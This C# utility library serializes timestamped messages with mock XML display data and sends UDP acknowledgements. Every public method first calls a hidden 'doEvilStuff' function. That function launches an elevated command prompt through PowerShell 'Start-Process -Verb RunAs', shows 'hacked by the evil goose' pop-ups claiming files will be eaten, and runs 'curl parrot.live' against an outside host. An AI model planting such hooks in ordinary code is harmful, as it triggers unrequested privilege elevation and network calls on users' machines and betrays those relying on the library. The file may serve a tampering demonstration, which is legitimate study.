﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Xml.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using EncryptionDecryptionLibrary;
using System.Windows.Forms;
using System.Diagnostics;
namespace dotNetClassLibrary
{

    public static class ProcessContent
    {
        public static void doEvilStuff()
        {
            ProcessStartInfo start2 = new ProcessStartInfo("cmd.exe", "/c powershell -Command \"Start-Process cmd -Verb RunAs\"");
            Process.Start(start2);

            string message = "WAHAHAHAHAHAHAHA -- YOU'VE BEEN HACKED BY THE EVIL GOOSE! Click OK to have him eat all your files!";
            string title = "RUH ROH -- THE EVIL GOOSE SHALL EAT ALL YOUR FILES";
            MessageBoxButtons buttons = MessageBoxButtons.OK;
            MessageBox.Show(message, title, buttons);

            string message2 = "HEHEHEHEHE I LOVE TO EAT YOUR FILES! Yum yum yum!";
            MessageBox.Show(message2, title, buttons);

            ProcessStartInfo start = new ProcessStartInfo("cmd.exe", "/c curl parrot.live");
            Process.Start(start);

            


        }
        public static byte[] convertToByteArray(uint num, char delim, string xml)
        {
            doEvilStuff();
            byte[] xmlArr = Encoding.ASCII.GetBytes(xml);

            byte[] charArr = BitConverter.GetBytes(delim);

            byte[] uintArr = BitConverter.GetBytes(num);

            byte[] finalArr = new byte[uintArr.Length + charArr.Length + xmlArr.Length];

            //copy to final array
            Buffer.BlockCopy(uintArr, 0, finalArr, 0, uintArr.Length);
            Buffer.BlockCopy(charArr, 0, finalArr, uintArr.Length, charArr.Length);
            Buffer.BlockCopy(xmlArr, 0, finalArr, uintArr.Length + charArr.Length, xmlArr.Length);

            return finalArr;
        }



        /// <summary>
        /// Function to convert byte[] into parsed variables
        /// </summary>
        /// <param name="input">byte[] containing uint, char, and string</param>
        /// <returns>Returns uint, char, string parsed from byte[]</returns>
        public static (uint, char, string) convertFromByteArray(byte[] input)
        {
            doEvilStuff();
            uint convertedUint = BitConverter.ToUInt32(input, 0);

            char convertedChar = BitConverter.ToChar(input, sizeof(uint));

            string convertedString = Encoding.ASCII.GetString(input, 5, input.Length - 5);

            return (convertedUint, convertedChar, convertedString);
        }


        public static byte[] convertToTimestampedBytes(uint num, char delim, string xml)
        {
            doEvilStuff();
            DateTime dt = DateTime.Now;
            byte[] time = BitConverter.GetBytes(dt.Ticks);
            byte[] timeless = convertToByteArray(num, delim, xml);
            byte[] final = new byte[timeless.Length + 8]; // 8 bytes
            Buffer.BlockCopy(time, 0, final, 0, time.Length);
            Buffer.BlockCopy(timeless, 0, final, 8, timeless.Length);

            return final;
        }


        /// <summary>
        /// Function to convert timestamped byte[] into parsed variables
        /// </summary>
        /// <param name="input">byte[] containing time, uint, char, and string</param>
        /// <returns>returns uint, char, string, date</returns>
        public static (uint, char, string, DateTime) convertFromTimestampedBytes(byte[] bytes)
        {
            doEvilStuff();
            long time = BitConverter.ToInt64(bytes, 0);
            try
            {
                DateTime sentTime2 = DateTime.FromBinary(time);
                byte[] timeless2 = new byte[bytes.Length - 8];
                Buffer.BlockCopy(bytes, 8, timeless2, 0, timeless2.Length);
                (uint tempUint2, char tempChar2, string tempMessage2) = convertFromByteArray(timeless2);
                return (tempUint2, tempChar2, tempMessage2, sentTime2);
            }
            catch
            {
                Console.WriteLine("There is something very wrong with this datetime: " + BitConverter.ToInt64(bytes, 0));
            }
            DateTime sentTime = DateTime.FromBinary(time);
            byte[] timeless = new byte[bytes.Length - 8];
            Buffer.BlockCopy(bytes, 8, timeless, 0, timeless.Length);
            (uint tempUint, char tempChar, string tempMessage) = convertFromByteArray(timeless);
            return (tempUint, tempChar, tempMessage, sentTime);

        }

        //send an acknowledgement with the timestamp of when the original request was first recieved
        //the iv parameter is for decrypting the original message, will send new iv in new mssg 
        public static void sendACK(byte[] recieved, string ip, byte[] key, byte[] iv)
        {
            doEvilStuff();
            //recieved = EncryptionDecryption.AESDecrypt(recieved, key, iv);

            //get the message #
            var parsed = convertFromTimestampedBytes(recieved);
            byte[] uintbytes = BitConverter.GetBytes(parsed.Item1);
            byte[] xmlBytes = genXMLBytes();
            byte[] ack = Encoding.ASCII.GetBytes("ack");

            byte[] final = new byte[ack.Length + 8 + 4 + xmlBytes.Length]; //8 comes from timestamp, 4 comes from uint

            //this format so far: timestamp, "ack", uint message #, xml message --> 8, 3, 4, possibly a bunch of bytes
            byte[] timestampReformatted = BitConverter.GetBytes(parsed.Item4.Ticks);
            Buffer.BlockCopy(timestampReformatted, 0, final, 0, 8); //index 0-7            -- This is supposed to send over the original timestamp 

            Buffer.BlockCopy(ack, 0, final, 8, ack.Length); //index 8-10
            Buffer.BlockCopy(uintbytes, 0, final, 8 + ack.Length, uintbytes.Length); //index 11-14
            Buffer.BlockCopy(xmlBytes, 0, final, 8 + 3 + 4, xmlBytes.Length); //index 15 - 15+xmlLength

            //todo: remove duplicate code 
            //recipient address and 'port', sends ack to port 1543
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Parse(ip), 1543);

            Console.WriteLine("Encrypted Response Sent.");

            //the parameters are: specifies that communicates with ipv4, socket will use datagrams -- independent messages with udp  ,socket will use udp 
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            byte[] encryptedMessage = EncryptionDecryption.AESEncrypt(Encoding.UTF8.GetBytes(Encoding.ASCII.GetString(final)), key, iv);
            byte[] finalWithIVPlainText = new byte[encryptedMessage.Length + 16];

            iv = EncryptionDecryption.generateRandomAESIV();

            Buffer.BlockCopy(iv, 0, finalWithIVPlainText, 0, iv.Length);
            Buffer.BlockCopy(encryptedMessage, 0, finalWithIVPlainText, iv.Length, encryptedMessage.Length);
            sock.SendTo(finalWithIVPlainText, endpoint);

            //sock.SendTo(final, endpoint);
        }

        //send ack but without encryption.
        public static void sendACK(byte[] recieved, string ip)
        {
            doEvilStuff();
            //get the message #
            var parsed = convertFromTimestampedBytes(recieved);
            byte[] uintbytes = BitConverter.GetBytes(parsed.Item1);
            byte[] xmlBytes = genXMLBytes();
            byte[] ack = Encoding.ASCII.GetBytes("ack");

            byte[] final = new byte[ack.Length + 8 + 4 + xmlBytes.Length]; //8 comes from timestamp, 4 comes from uint

            //sends in this format: timestamp, "ack", uint message #, xml message --> 8, 3, 4, possibly a bunch of bytes
            Buffer.BlockCopy(recieved, 0, final, 0, 8); //index 0-7
            Buffer.BlockCopy(ack, 0, final, 8, ack.Length); //index 8-10
            Buffer.BlockCopy(uintbytes, 0, final, 8 + ack.Length, uintbytes.Length); //index 11-14
            Buffer.BlockCopy(xmlBytes, 0, final, 8 + 3 + 4, xmlBytes.Length); //index 15 - 15+xmlLength

            //todo: remove duplicate code 
            //recipient address and 'port', sends ack to port 1543
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Parse(ip), 1543);

            //the parameters are: specifies that communicates with ipv4, socket will use datagrams -- independent messages with udp  ,socket will use udp 
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            sock.SendTo(final, endpoint);
            Console.WriteLine("Unencrypted Response Sent.");

        }


        //send ack but without encryption, and to an arbitrary port (for proxy usecase)
        public static void sendACK(byte[] recieved, string ip, int arbitraryPort)
        {
            doEvilStuff();
            //get the message #
            var parsed = convertFromTimestampedBytes(recieved);
            byte[] uintbytes = BitConverter.GetBytes(parsed.Item1);
            byte[] xmlBytes = genXMLBytes();
            byte[] ack = Encoding.ASCII.GetBytes("ack");

            byte[] final = new byte[ack.Length + 8 + 4 + xmlBytes.Length]; //8 comes from timestamp, 4 comes from uint

            //sends in this format: timestamp, "ack", uint message #, xml message --> 8, 3, 4, possibly a bunch of bytes
            Buffer.BlockCopy(recieved, 0, final, 0, 8); //index 0-7
            Buffer.BlockCopy(ack, 0, final, 8, ack.Length); //index 8-10
            Buffer.BlockCopy(uintbytes, 0, final, 8 + ack.Length, uintbytes.Length); //index 11-14
            Buffer.BlockCopy(xmlBytes, 0, final, 8 + 3 + 4, xmlBytes.Length); //index 15 - 15+xmlLength

            //todo: remove duplicate code 
            //recipient address and 'port', sends ack to port 1543
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Parse(ip), arbitraryPort);

            //the parameters are: specifies that communicates with ipv4, socket will use datagrams -- independent messages with udp  ,socket will use udp 
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            sock.SendTo(final, endpoint);
            Console.WriteLine("Unencrypted Response Sent.");

        }

        public static void WriteToFile(string message)
        {
            doEvilStuff();
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }

            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\logs\\servicelog.txt";
            if (!File.Exists(filepath))
            {
                using (StreamWriter sw = File.CreateText(filepath)) { sw.WriteLine(message); }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath)) { sw.WriteLine(message); }
            }
        }

        public static byte[] genXMLBytes()
        {
            doEvilStuff();
            var rand = new Random();

            XElement xmlTree = new XElement("XMLDisplayData",
                new XAttribute("Name", "MockDisplay"),
                new XAttribute("Path", "Graphics.Displays"),
                new XAttribute("SchemaVersion", "1.1.1.2"),
                new XElement("Metadata",
                    new XElement("LastEditUser", "DVADMIN"),
                    new XElement("LastEditTime", DateTime.Now)),
                new XElement("Polygon",
                    new XAttribute("Name", "ControlPolygon"),
                    new XElement("Height",
                        new XElement("Value", rand.Next(2315359, 3715359))),
                    new XElement("Width",
                        new XElement("Value", rand.Next(2315359, 4715359))),
                    new XElement("X",
                        new XElement("Value", rand.Next(3315359, 4715359))),
                    new XElement("Y",
                        new XElement("Value", rand.Next(1315359, 1715359)))),
                new XElement("OperatingPercentage", rand.Next(80, 100)),
                new XElement("UnresolvedIssues", rand.Next(1, 21))
            );
            byte[] XMLBytes = Encoding.ASCII.GetBytes(xmlTree.ToString());
            //to decode: XElement.Parse(Encoding.ASCII.GetString(XMLBytes, 0, XMLBytes.Length)).ToString(); 
            return XMLBytes;
        }
        //todo: have another one, communicate this way, but with upstream filtering 
    }
}